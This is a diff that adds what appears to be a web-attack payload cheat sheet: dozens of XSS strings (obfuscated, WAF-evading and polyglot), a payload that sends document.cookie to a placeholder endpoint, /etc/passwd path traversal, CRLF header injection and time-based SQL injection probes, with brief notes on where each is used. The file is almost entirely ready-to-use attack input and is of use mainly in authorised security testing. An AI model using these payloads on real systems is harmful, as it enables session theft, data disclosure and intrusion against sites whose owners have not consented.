@@ -1,0 +1,54 @@
+    <details ontoggle=alert(1337) open>
+"><input autofocus nope="%26quot;x%26quot;"onfocus="frames.location='YOUR_ENDPOINT?c='+Reflect.get(document,'coo'+'kie')">
+next=javascript:top[/al/.source+/ert/.source](document.cookie)
+');alert(1);//
+
+//%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd 
+
+%0d%0aSet-Cookie:%20csrf=fake%3b%20SameSite=None --> CRLf injection
+
+A=![]+'';B=!![]+'';C=[][[]]+'';F=[][C[4]+C[5]+A[2]+B[0]+A[4]+B[1]];D=F+'';F[D[3]+D[6]+C[1]+A[3]+B[0]+B[1]+C[0]+D[3]+B[0]+D[6]+B[1]](A[1]+A[2]+A[4]+B[1]+B[0]+'(1)')()
+javascript:(alert(%27XSS%20Success!%27))()
+//j%5c%5cjavascript%3aalert(document.domain)
+%F0%9F%98%82<%3CsVg/onload%F0%9F%98%82=/svg/onload%3Dsvg/onmouseOver=confirm`1`><!--%F0%9F%98%82//=
+-alert('def1ant')-'?=
+%26%2302java%26%23115cript:alert(document.domain)
+Mega7>XSS<A/href=https://evil.com
+Mega7%3EXSS%3CIMG/SRC=https://www.notebookcheck.net/fileadmin/Notebooks/News/_nc3/hacker21.jpg
+"><svg onload=alert(1)>
+<img src=1 onerror=alert(1)>
+javascript:alert(document.cookie)
+"onmouseover="alert(1)
+{{$on.constructor('alert(1)')()}}
+\"-alert(1)}//
+
+/%3Cimg%20src=x%20onerror=%22prompt(1)%22%3Eaaaaaaaaaaaa
+
+<svg/onload=alert(document.domain)>
+
+0'XOR(if(now()=sysdate(),sleep(6),0))XOR'
+'XOR(if(now()=sysdate(),sleep(2*2),0))OR'
+
+{{base-uri}}/assets/built%2F..%2F..%2F/package.json
+
+1%3Csvg%20onload%3Dprompt(0)%3E
+%3Csvg%20onload=%0Aalert`xss-found`%3E
+
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
+
+<img src=x onerror=alert(document.domain)>
+
+SQL injection in search
+//AND//'1%'='1  --> Should return result 
+//AND//'1%'='0  --> Shouldn't returen result
+
+"><Svg Only=1 OnLoad=confirm(atob("Q2xvdWRmbGFyZSBYU1MgQG1fa2VsZXBjZQ=="))>  -->bypass cloudfare
+
+ ["');alert('XSS');//"]@xyz.xxx   ----> email field
+
+ \u003e\u003cimg src=1 onerror=alert(0)\u003e
+    
+“><svg onload="prompt(/xss/);"><!--
+
+<object data=data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoNCk+></object>
+
